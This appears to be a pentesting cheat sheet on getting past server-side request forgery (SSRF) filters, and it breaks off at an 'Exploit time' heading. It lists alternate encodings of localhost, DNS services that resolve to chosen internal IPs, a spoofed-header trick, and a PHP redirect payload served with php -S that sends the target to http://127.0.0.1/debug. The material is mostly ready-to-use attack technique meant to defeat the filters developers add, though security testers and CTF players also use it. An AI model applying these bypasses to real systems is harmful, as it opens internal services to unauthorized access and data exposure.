# Useful services
If you need to bypass a loop-back/private address blockage done on code back-end that do not permits you to bypass it you can:
1)Try using **X-Forwarder-For(aka override)** headers to bypass the blockage.
2)If localhost is needed
In this case you can use **localtest.me**, which resolves to 127.0.0.1(reference: https://readme.localtest.me/)
3)If any other IPv4(your choice)
**192-168-1-250.nip.io maps to 192.168.1.250**
(just edit with your ip that you need   https://nip.io/)
OR Another alternative to setup locally(https://traefik.me/) 


# Bypass Techniques
SSRF Bypass (Serverside request forgery)
Here you will find some usefull tips to bypass SSRF if the DEVS implemented a filter to inhibit you to access example local/private resources.

1)If the app blocks **localhost/127.0.0.1**
```
def check_domain(domain):
    if 'localhost' in domain:
        return False
    if domain == '127.0.0.1':
        return False
    return True
```
Then you can encode the localhost as:
```
    Localhost Address Block: 127.0.0.0 - 127.255.255.255
    Shortened IP Adress: 127.1
    Prolonged IP Address: 127.000000000000000.1
    All Zeroes: 0.0.0.0
    Shortened All Zeroes: 0
    Decimal Representation: 2130706433
    Octal Representation: 0177.0000.0000.0001
    Hex Representation: 0x7f000001
    IPv6 loopback address: 0:0:0:0:0:0:0:1 (also ::1)
    IPv4-mapped IPv6 loopback address: ::ffff:127.0.0.1
```
2)If the app blocks more **internal private IPs**:
   # check internal IP address space
```
        if ip in ipaddress.ip_network('127.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('10.0.0.0/8'):
            return False
        if ip in ipaddress.ip_network('172.16.0.0/12'):
            return False
        if ip in ipaddress.ip_network('192.168.0.0/16'):
            return False
        if ip in ipaddress.ip_network('0.0.0.0/8'):
            return False
```
3)You can perform step 2 with HTTP redirect as-well! OBS: The application must allow to follow redirects otherwise might fail (HERE WILL FAIL: `requests.get(url, allow_redirects=False)`)
Prepare a **redirect.php** that access the page that is hidden(in our example is /debug):
```
<?php header('Location: http://127.0.0.1/debug'); ?>
```
Host it locally:
```
php -S 0.0.0.0:80
```
Exploit time(this will get the PHP and from header will perform a redirect via HTTP headers and successfully bypass the easiest checks!):
